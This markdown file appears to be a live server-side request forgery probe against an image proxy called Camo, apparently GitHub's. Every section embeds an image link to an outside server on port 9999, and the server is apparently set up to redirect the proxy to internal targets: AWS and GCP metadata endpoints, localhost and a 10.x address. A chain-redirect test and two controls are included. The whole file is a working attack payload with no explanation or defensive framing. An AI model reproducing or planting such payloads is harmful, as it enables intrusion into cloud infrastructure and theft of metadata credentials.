# SSRF Test v62 - nip.io DNS Bypass

Testing if Camo follows redirects to nip.io domains that resolve to internal IPs.

## AWS Metadata via nip.io (169.254.169.254.nip.io)
![AWS nip.io](http://164.90.187.218.nip.io:9999/aws?v=62)

## Localhost via nip.io (127.0.0.1.nip.io)
![Localhost nip.io](http://164.90.187.218.nip.io:9999/localhost?v=62)

## Internal via nip.io (10.0.0.1.nip.io)
![Internal nip.io](http://164.90.187.218.nip.io:9999/internal?v=62)

## GCP Metadata (metadata.google.internal)
![GCP](http://164.90.187.218.nip.io:9999/gcp?v=62)

## Chain Redirect Test
![Chain](http://164.90.187.218.nip.io:9999/chain?v=62)

## Control: Raw AWS IP (should be blocked)
![AWS Raw](http://164.90.187.218.nip.io:9999/awsraw?v=62)

## Control: Raw Localhost (should be blocked)
![Localhost Raw](http://164.90.187.218.nip.io:9999/localraw?v=62)

Timestamp: 2026-01-12T15:15:00Z
